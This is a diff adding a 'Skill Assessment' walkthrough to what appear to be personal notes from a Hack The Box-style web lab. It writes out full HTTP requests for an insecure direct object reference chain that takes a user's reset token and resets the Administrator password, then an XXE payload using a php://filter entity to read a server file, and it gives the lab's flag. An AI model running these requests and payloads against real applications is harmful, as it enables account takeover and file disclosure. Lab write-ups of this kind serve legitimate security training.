@@ -138,3 +138,57 @@ The XXE xml payload:
 ]>
 <root>&content;</root>
 
+# Skill Assessment
+
+1. First, there is an api path: GET /api.php/user/74 that is authenticated with given credentials. 
+2. with request id 52 the response is {"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
+3. Request the /api.php/token/52 - Response: 
+{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
+4. Request to change the password of the Administrator
+
+PUT /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=anne HTTP/1.1
+Host: 94.237.59.180:54333
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.59.180:54333/settings.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 63
+Origin: http://94.237.59.180:54333
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=urdfe2mq9af4tjigd118sksob5; uid=74
+Sec-GPC: 1
+
+uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=anne
+
+5. Login to admin account
+
+6. Request to retrieve the flag with XXE payload:
+
+POST /addEvent.php HTTP/1.1
+Host: 94.237.59.180:54333
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.59.180:54333/event.php
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 302
+Origin: http://94.237.59.180:54333
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=urdfe2mq9af4tjigd118sksob5; uid=52
+Sec-GPC: 1
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+    <!ENTITY Test SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]>
+            <root>
+            <name>&Test;</name>
+            <details>qwerqwer</details>
+            <date>2025-02-20</date>
+            </root>
+
+Answer: HTB{m4573r_w3b_4774ck3r}
